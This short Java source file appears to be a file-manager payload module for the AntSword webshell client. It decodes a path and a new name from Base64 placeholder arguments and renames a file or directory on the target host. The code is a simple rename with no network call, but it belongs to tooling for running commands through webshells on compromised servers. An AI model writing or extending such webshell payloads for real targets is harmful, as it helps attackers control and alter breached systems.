package filemanager;

import antSword.Template;

import java.io.File;

public class Rename extends Template {
    @Override
    public String run() throws Exception {
        String z1 = new String(this.Base64DecodeToByte("antswordargpath"), this.cs);
        String z2 = new String(this.Base64DecodeToByte("antswordargname"), this.cs);
        return RenameFileOrDirCode(z1, z2);

    }

    String RenameFileOrDirCode(String oldName, String newName) throws Exception {
        File sf = new File(oldName), df = new File(newName);
        sf.renameTo(df);
        return "1";
    }
}
